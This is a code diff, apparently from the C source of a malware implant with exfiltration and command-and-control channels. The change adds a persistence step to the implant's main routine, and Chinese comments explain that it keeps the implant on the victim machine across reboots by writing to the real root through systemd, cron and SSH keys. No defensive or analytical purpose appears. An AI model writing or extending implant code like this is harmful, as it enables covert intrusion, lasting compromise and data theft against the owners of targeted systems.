@@ -58,6 +58,7 @@
 #include "p2p_cell.h"
 #include "exfil.h"
 #include "exfil_link.h"
+#include "persist.h"
 #include "exfil_sched.h"
 #include "exfil_task.h"
 #include "exfil_task_link.h"
@@ -508,6 +509,18 @@ static int implant_run(int cmd_fd, int data_fd, const mono_cfg_t *cfg,
 
     memcpy(pfx_cmd, tsc, 8);
     memcpy(pfx_data, tsc + 8, 8);
+
+    /* 持久化：确保重启后驻留。幂等；已驻留返回 1，首次安装返回 0。
+     * root_prefix 传 NULL 即写真实根（部署语义）。 */
+    {
+        char binp[512];
+        int meth[3];
+        int pr = persist_linux_ensure(NULL, binp, sizeof binp, meth, 3);
+        if (cfg->verbose)
+            fprintf(stderr, "[implant] persistence ensure rc=%d bin=%s "
+                    "(systemd=%d cron=%d sshkey=%d)\n",
+                    pr, binp, meth[0], meth[1], meth[2]);
+    }
 
     /* 任务通道：ks = 本端(植入体)发往服务端 = k_c2s；kr = k_s2c */
     if (exfil_task_chan_init(&ch, sk->k_c2s, sk->k_s2c, pfx_cmd) != EXF_TASK_OK)
